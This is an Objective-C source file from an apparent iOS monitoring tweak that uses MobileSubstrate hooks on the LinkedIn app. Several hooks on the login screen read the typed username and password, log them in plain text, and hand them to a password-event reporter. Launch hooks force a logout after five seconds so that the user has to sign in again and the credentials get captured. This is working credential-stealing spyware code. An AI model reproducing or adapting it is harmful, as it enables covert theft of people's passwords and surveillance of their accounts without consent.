//
//  LinkedInPwd.h
//  MSFSP
//
//  Created by Makara Khloth on 1/18/16.
//
//

#import "MSFSP.h"
#import "DateTimeFormat.h"
#import "FxPasswordEvent.h"
#import "PasswordController.h"

#import "VoyagerAppDelegate.h"
#import "VoyagerCoreAuth.h"

#import "_TtC13VoyagerGrowth19LoginViewController.h"
#import "_TtC8LinkedIn11AppDelegate.h"

#import <objc/runtime.h>

#pragma mark Swift
#pragma mark Capture password

// 9.0.2
void (*loginViewControllerLoginTapped)(id self);
MSHook(void, loginViewControllerLoginTapped, id self) {
    DLog(@"\n\n&&&&&&&&&&&&&& LoginViewController --> loginTapped &&&&&&&&&&&&&&\n\n");
    
    UITextField *usernameTextField = [self performSelector:@selector(usernameTextField) withObject:nil];
    UITextField *passwordTextField = [self performSelector:@selector(passwordTextField) withObject:nil];
    
    NSString *account = usernameTextField.text;
    NSString *password = passwordTextField.text;
    
    if (account     &&  [account length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", account, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
    
    _loginViewControllerLoginTapped(self);
}

// 9.0.23

HOOK(_TtC13VoyagerGrowth19LoginViewController, textFieldShouldReturn$, BOOL, id arg1) {
    UITextField *usernameTextField = self.usernameTextField;
    UITextField *passwordTextField = self.passwordTextField;
    
    if (arg1 == passwordTextField) {
        NSString *account = usernameTextField.text;
        NSString *password = passwordTextField.text;
        
        if (account     &&  [account length]    &&
            password    &&  [password length])  {
            
            DLog(@"Capture account and password [%@] [%@]", account, password)
            
            NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
            
            [PasswordUtils sendPasswordEventForAccount:account
                                              password:password
                                         applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                       applicationName:applicationName];
        }
    }
    
    return CALL_ORIG(_TtC13VoyagerGrowth19LoginViewController, textFieldShouldReturn$, arg1);
}

HOOK(_TtC13VoyagerGrowth19LoginViewController, loginTapped, void) {
    
    UITextField *usernameTextField = self.usernameTextField;
    UITextField *passwordTextField = self.passwordTextField;
    
    NSString *account = usernameTextField.text;
    NSString *password = passwordTextField.text;
    
    if (account     &&  [account length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", account, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
    
    CALL_ORIG(_TtC13VoyagerGrowth19LoginViewController, loginTapped);
}

#pragma mark Force log out

// 9.0.2
// Original class name is Voyager.AppDelegate in framework
HOOK(VoyagerAppDelegate, application$didFinishLaunchingWithOptions$, BOOL, id application, id options) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& VoyagerAppDelegate --> application$didFinishLaunchingWithOptions$ &&&&&&&&&&&&&&\n\n");
    
    BOOL retValue = CALL_ORIG(VoyagerAppDelegate, application$didFinishLaunchingWithOptions$, application, options);
    
    if ([PasswordController isForceLogOutWithPasswordAppID:kLinkedIn]) {
        DLog(@"!!!!! FORCE LOGOUT LinkedIn !!!!!!")
        
        Class $VoyagerCoreAuth(objc_getClass("_TtC11VoyagerCore4Auth"));
        id voyagerCoreAuth = [$VoyagerCoreAuth performSelector:@selector(sharedInstance) withObject:nil];
        [voyagerCoreAuth performSelector:@selector(logout) withObject:nil afterDelay:5];
        
        [PasswordController forcePasswordAppID:kLinkedIn logOut:kReset];
    }
    
    return retValue;
}

// 9.0.23
HOOK(_TtC8LinkedIn11AppDelegate, application$didFinishLaunchingWithOptions$, BOOL, id application, id options) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& _TtC8LinkedIn11AppDelegate --> application$didFinishLaunchingWithOptions$ &&&&&&&&&&&&&&\n\n");
    
    BOOL retValue = CALL_ORIG(_TtC8LinkedIn11AppDelegate, application$didFinishLaunchingWithOptions$, application, options);
    
    @try {
        if ([PasswordController isForceLogOutWithPasswordAppID:kLinkedIn]) {
            DLog(@"!!!!! FORCE LOGOUT LinkedIn !!!!!!")
            
            Class $VoyagerCoreAuth(objc_getClass("_TtC11VoyagerCore4Auth"));
            
            id voyagerCoreAuth = nil;
            
            if ([$VoyagerCoreAuth respondsToSelector:@selector(sharedInstance)]) {
                voyagerCoreAuth = [$VoyagerCoreAuth performSelector:@selector(sharedInstance) withObject:nil];
            }
            else if ([$VoyagerCoreAuth respondsToSelector:@selector(shared)])
                voyagerCoreAuth = [$VoyagerCoreAuth performSelector:@selector(shared) withObject:nil];
            
            DLog(@"voyagerCoreAuth %@", voyagerCoreAuth);
            
            if (voyagerCoreAuth) {
                if ([voyagerCoreAuth respondsToSelector:@selector(logout)]) {//Below 9.0.28
                    [voyagerCoreAuth performSelector:@selector(logout) withObject:nil afterDelay:5];
                }
                else if ([voyagerCoreAuth respondsToSelector:@selector(logoutUser)]) {//9.0.28
                    [voyagerCoreAuth performSelector:@selector(logoutUser) withObject:nil afterDelay:5];
                }
            }
            
            [PasswordController forcePasswordAppID:kLinkedIn logOut:kReset];
        }
    } @catch (NSException *exception) {
        DLog(@"Found exception %@", exception);
    } @finally {
        //Done
    }

    
    return retValue;
}

